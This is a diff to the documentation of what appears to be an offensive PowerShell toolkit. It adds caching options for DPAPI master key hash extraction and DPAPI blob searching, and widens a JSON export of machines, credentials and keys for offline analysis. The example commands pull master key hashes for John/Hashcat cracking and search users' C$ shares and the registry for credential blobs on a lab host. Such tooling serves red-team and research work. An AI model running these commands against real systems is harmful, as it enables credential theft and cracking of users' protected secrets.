@@ -214,7 +214,7 @@ Add-TBOCacheObservation -ServerName corp1-web01.corp1.lab.home-labs.lol `
 
 ### Export-TBOCacheJson
 
-Exports the persistent cache as a JSON document (machines, principals, credentials, observations) for offline ingestion (for example, Nemesis).
+Exports the persistent cache as a JSON document (machines, principals, credentials, observations, DPAPI master keys, DPAPI blob hits) for offline ingestion (for example, Nemesis).
 
 ```powershell
 # Export as JSON.
@@ -707,6 +707,9 @@ When a `BK-*` file is present in a user Protect directory, the hash context is s
 ```powershell
 Get-TBODpapiMasterKeyHashes -ServerName corp1-web01.corp1.lab.home-labs.lol
 
+# Cache DPAPI master key hashes for later cracking/worklist/export.
+Get-TBODpapiMasterKeyHashes -ServerName corp1-web01.corp1.lab.home-labs.lol -Cache
+
 # Dump only the John/Hashcat lines to a file
 Get-TBODpapiMasterKeyHashes -ServerName corp1-web01.corp1.lab.home-labs.lol |
   Select-Object -ExpandProperty HashLine |
@@ -727,6 +730,9 @@ Use `-Recurse` to walk child directories or registry keys.
 Find-TBODpapiBlobs -ServerName corp1-web01.corp1.lab.home-labs.lol -Path '\\corp1-web01.corp1.lab.home-labs.lol\C$\Users' -Recurse
 Find-TBODpapiBlobs -ServerName corp1-web01.corp1.lab.home-labs.lol -Path tbo:\Users -Recurse -MaxBytes 2048
 Find-TBODpapiBlobs -ServerName corp1-web01.corp1.lab.home-labs.lol -RegistryPath HKLM\Software\Microsoft -Recurse
+
+# Cache DPAPI blob hits for later triage/worklist/export.
+Find-TBODpapiBlobs -ServerName corp1-web01.corp1.lab.home-labs.lol -Path tbo:\Users -Recurse -Cache
 ```
 
 #### Get-TBODpapiBlob
